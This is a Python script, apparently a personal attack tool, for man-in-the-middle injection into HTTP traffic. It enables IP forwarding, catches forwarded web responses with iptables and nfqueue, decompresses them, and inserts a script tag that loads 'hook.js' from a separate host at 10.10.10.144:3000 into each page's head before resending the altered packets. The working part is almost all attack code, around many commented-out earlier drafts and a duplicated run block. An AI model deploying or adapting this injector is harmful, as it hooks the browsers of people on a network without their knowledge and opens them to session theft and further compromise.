#!/usr/bin/python
import argparse
from scapy.all import *
#Below =0 necessary to receive a response to the DHCP packets because you broadcasat dhcp as dif ip(?)
conf.checkIPaddr=0
import threading
import urlparse
from subprocess import *
import re
import time
import os
import commands
bash=commands.getoutput
import nfqueue
import cStringIO
import gzip
import zlib
import urllib2
import sys

#Notes:
# Changing the length of the packet load at all leads to Ethernet frame sequence errors
# This leads to lots of retransmitted packets but the victim never can make a connection to the site
# Replacing content and keeping length the same works.

os.system('/bin/echo 1 > /proc/sys/net/ipv4/ip_forward')
#os.system('/sbin/iptables -t nat -A PREROUTING -p tcp --dport 80 -j NFQUEUE')
os.system('/sbin/iptables -A FORWARD -p tcp --sport 80 -j NFQUEUE')
#os.system('/sbin/iptables -A FORWARD -p tcp -j NFQUEUE')
msg = '<script src=http://10.10.10.144:3000/hook.js></script>'
#msg = 'OWNED'
oldack = 0
full_data = ''
catch_pkts = 0
start_time = 0
full_pkt = ''
oldserver = ''
httpnewlength = ''
drop_pkt = 0

def all_data():
	global catch_pkts, httpnewlength, drop_pkt
	print 'content-type is found, and catch_pkts == 1!!'
	if full_pkt != '' and full_data != '':

		try:
			headers, body = full_data.split("\r\n\r\n", 1)
		except:
			print 'headers have full load, no body'
			headers = full_data
			body = ''

		if 'Content-Encoding: gzip' in headers:
			print 'content-encoding found in headers, decomping body...'
			if body != '':
				try:
					decomp=zlib.decompressobj(16+zlib.MAX_WBITS)
					body = decomp.decompress(body)
				except:
					print '!!!!!!!! could not decompress body'

		###################
		# INJECT HERE
		###################
		if '<html' in body:
			psplit = str(body).split('<head')
			try:
				body = psplit[0]+'<head> '+msg+psplit[1]#[len(msg):]
			except:
				print '<head> not found'
				return

		fp = open("%s.html" % (ack), "w")
		fp.write(headers+"\r\n\r\n"+body)
		fp.close()

		if 'Content-Encoding: gzip' in headers:
			try:
				comp_body = cStringIO.StringIO()
				f = gzip.GzipFile(fileobj=comp_body, mode='wb', compresslevel = 6)
				f.write(body)
				f.close()
				body = comp_body.getvalue()
			except:
				print '!!!!!!!!!!!!!! could not RECOMPRESS body'

		try:
			httporiginallength = headers.split('Content-Length: ')[1].split("\r")[0]
		except:
			print '!!!!!!!!!!! Could not split headers at Content-Length\n'
			return
		print 'Original Content-Length: ', httporiginallength
		httpnewlength = str(len(headers+"\r\n\r\n"+body))
		headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + httpnewlength)
		print 'Injected Content-Length: ', httpnewlength
		print 'len(full_pkt[IP]): ', len(full_pkt[IP])

		full_pkt[Raw].load = headers+"\r\n\r\n"+body
		full_pkt[IP].len = len(str(full_pkt))
		del full_pkt[IP].chksum
		del full_pkt[TCP].chksum

		catch_pkts = 0
		drop_pkt = 1
		send(full_pkt)

#Why does every example I've seen do cb(i, payload)? That always leads to an error for me on the q.set_callback
def cb(payload):
	global catch_pkts, oldack, full_data, start_time, full_pkt, ack, oldserver
	pkt = IP(payload.get_data())
	current_time = time.time()
	if pkt.haslayer(Raw) and pkt.haslayer(TCP) and pkt[TCP].sport == 80:
		load = pkt[Raw].load
		ack = pkt[TCP].ack
		server = pkt[IP].src
		print oldack, ack
######################
		if drop_pkt == 1:
			payload.set_verdict(nfqueue.NF_ACCEPT)
			return
		# Drop retransmitted text/html
###### Might I be dropping my own packet?
#		if ack == oldack and drop_pkt == 1:
#			if 'Content-Type: text/html' in load:
#				try:
#					headers, body = load.split("\r\n\r\n", 1)
#				except:
#					print 'headers have full load, no body'
#					headers = load
#					body = ''
#				try:
#					httporiginallength = headers.split('Content-Length: ')[1].split("\r")[0]
#				except:
#					print '!!!!!!!!!!!!!!! Could not split headers at Content-Length\n'
#				if server == oldserver and httporiginallength != httpnewlength:
#					print '***** dropping retransmitted text/html', httporiginallength, httpnewlength
#					payload.set_verdict(nfqueue.NF_DROP)

		if 'Content-Type: text/html' in load and catch_pkts == 0:
			print 'Content-type text/html found oldack: ',oldack, ack
			oldserver = pkt[IP].src
			oldack = ack
			full_pkt = pkt
			full_data = load
			server = pkt[IP].src
			catch_pkts = 1
			payload.set_verdict(nfqueue.NF_DROP)
			return
		if 'Content-Type: text/html' in load and catch_pkts == 1:
			payload.set_verdict(nfqueue.NF_DROP)
			all_data()
		if catch_pkts == 1 and oldack == ack and oldack != 0:
			full_data = full_data+load
			print 'added data to full_data'
			payload.set_verdict(nfqueue.NF_DROP)
			start_time = time.time()
			return

q = nfqueue.queue()
q.open()
#q.bind(socket.AF_INET)
q.set_callback(cb)
#q.create_queue(0)
q.fast_open(0, socket.AF_INET)
try:
	q.try_run()
except KeyboardInterrupt:
	print 'trl-C: Exiting...'
	os.system('iptables -X')
	os.system('iptables -F')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	q.unbind(socket.AF_INET)
	q.close()
#		else:
#			if oldack != ack and oldack != 0 and catch_pkts == 1:
#				print '[*] trying to insert script and send'
#				catch_pkts = 0
#				try:
#					headers, body = full_data.split("\r\n\r\n", 1)
#				except:
#					print 'headers have full load, no body'
#					headers = full_data
#					body = ''
#				print '******HEADERS******\n',headers
#				print '******BODY*********\n', body
#				print ''
#				if 'Content-Encoding: gzip' in headers:
#					print 'content-encoding found in headers, decomping body...'
#					if body != '':
#						decomp=zlib.decompressobj(16+zlib.MAX_WBITS)
#						body = decomp.decompress(body)
#				if '<head ' in body:
##### maybe try no str() if this doesn't work
#					psplit = str(body).split('<head ')
#					try:
#						body = psplit[0]+'<head '+msg+psplit[1]
#						print body
#					except:
#						print '<head not found'
#						return
#				if 'Content-Encoding: gzip' in headers:
#					comp_body = cStringIO.StringIO()
##				compresslevel 1-9 (6 is default, set to 2 to not see "frag needed" in wireshark visiting stallman.org who doesn't gzip his site) leads to final packets with len(pkt[IP])<=1500 rather than the original 1500
##				Only way to make len(pkt[IP]) > 1500 is to set compresslevel to 0.
#					f = gzip.GzipFile(fileobj=comp_body, mode='wb', compresslevel = 6)
#					f.write(body)
#					f.close()
#					body = comp_body.getvalue()
#				pkt[IP].flags = 0 # 2would be the flag Don't Fragment (DF), but fragmentation is needed. 0 is allow fragmentation
#				try:
#					httporiginallength = headers.split('Content-Length: ')[1].split("\r")[0]
#				except:
#					print 'Could not split headers at Content-Length\n'
#					return
#				print 'Original Content-Length: ', httporiginallength
#				httpnewlength = str(int(httporiginallength) + len(msg))
#				headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + httpnewlength)
##				headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + str(len(body)))
#				pkt[Raw].load = headers+"\r\n\r\n"+body
#				print 'Injected Content-Length: ', httpnewlength
#				print 'Original pkt[IP].len: ', pkt[IP].len
#				print 'len(pkt[IP]): ', len(pkt[IP])
#				pkt[IP].len = len(pkt[IP])
#				print 'Injected pkt[IP].len: ', pkt[IP].len
#				del pkt[IP].chksum
#				del pkt[TCP].chksum
##				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
##				payload.set_verdict(nfqueue.NF_DROP)
#				send(pkt)
#				print "Sent on the injected packet\n"
#				full_data = ''
#				oldack = ack

q = nfqueue.queue()
q.open()
#q.bind(socket.AF_INET)
q.set_callback(cb)
#q.create_queue(0)
q.fast_open(0, socket.AF_INET)
#q.process_pending(10)
#q.fast_open(0, socket.AF_INET)
#q.set_queue_maxlen(5000)
#q.get_fd()
#q.set_mode(nfqueue.NFQNL_COPY_PACKET)

try:
	q.try_run()
except KeyboardInterrupt:
	print 'trl-C: Exiting...'
	os.system('iptables -X')
	os.system('iptables -F')
	os.system('iptables -t nat -F')
	os.system('iptables -t nat -X')
	q.unbind(socket.AF_INET)
	q.close()

#		if ack == oldack:
#			full_data = full_data+data
#			payload.set_verdict(nfqueue.NF_DROP)
#			if 'Content-Type: text/html' in data:
#				try:
##			we can't have .split(r"\r\n\r\n") since that doesn't split it as we're not taking repr(pkt[Raw].load)
#					headers, body = pkt[Raw].load.split("\r\n\r\n")
#				except:
#					headers = pkt[Raw].load
#					body = ''

#####################
#		if 'Content-Type: text/html' in headers:
#			if 'Content-Encoding: gzip' in headers:
#				print 'content-encoding found in headers, decomping body...'
#				if body != '':
#					decomp=zlib.decompressobj(16+zlib.MAX_WBITS)
#					body = decomp.decompress(body)
##				header_lines = headers.split('\r\n')
##				for l in header_lines:
##					if 'Content-Encoding: gzip' in l:
##						header_lines.remove(l)
##				headers = '\r\n'.join(header_lines)
##				print repr(headers)
#			if '<head' in body:
#				psplit = str(body).split('<head')
#				try:
#					body = psplit[0]+'<head'+msg+psplit[1]#[len(msg):]
#				except:
#					print '<head not found'
#					return
#				print body
#				if 'Content-Encoding: gzip' in headers:
#					comp_body = cStringIO.StringIO()
##					compresslevel 1-9 (6 is default, set to 2 to not see "frag needed" in wireshark visiting stallman.org who doesn't gzip his site) leads to final packets with len(pkt[IP])<=1500 rather than the original 1500
##					Only way to make len(pkt[IP]) > 1500 is to set compresslevel to 0.
#					f = gzip.GzipFile(fileobj=comp_body, mode='wb', compresslevel = 6)
#					f.write(body)
#					f.close()
#					body = comp_body.getvalue()
#				pkt[IP].flags = 0 # 2would be the flag Don't Fragment (DF), but fragmentation is needed. 0 is allow fragmentation
#				try:
#					httporiginallength = headers.split('Content-Length: ')[1].split("\r")[0]
#				except:
#					return 'Could not split headers at Content-Length\n'
#				print 'Original Content-Length: ', httporiginallength
#				httpnewlength = str(int(httporiginallength) + len(msg))
#				headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + httpnewlength)
##				headers = headers.replace("Content-Length: " + httporiginallength, "Content-Length: " + str(len(body)))
#				pkt[Raw].load = headers+"\r\n\r\n"+body
#				print 'Injected Content-Length: ', httpnewlength
#				print 'Original pkt[IP].len: ', pkt[IP].len
#				print 'len(pkt[IP]): ', len(pkt[IP])
#				pkt[IP].len = len(pkt[IP])
#				print 'Injected pkt[IP].len: ', pkt[IP].len
#				del pkt[IP].chksum
#				del pkt[TCP].chksum
#				payload.set_verdict_modified(nfqueue.NF_ACCEPT, str(pkt), len(pkt))
##				payload.set_verdict(nfqueue.NF_DROP)
#				send(pkt)
#				print "Sent on the injected packet\n"
##			payload.set_verdict(nfqueue.NF_ACCEPT)
##	payload.set_verdict(nfqueue.NF_ACCEPT)


#		header_lines = headers.split('\r\n')
#		for l in header_lines:
#			if 'Content-Encoding: gzip' in l:
#				header_lines.remove(l)
#		headers = '\r\n'.join(header_lines)
#		print headers

#			if 'gzip' in pkt[Raw].load:
#				print 'content is gzippd'
#				if body != '':
#					compressedstream = StringIO.StringIO(body)
#					gzipper = gzip.GzipFile(fileobj=compressedstream)
#					data = gzipper.read()
#					print data
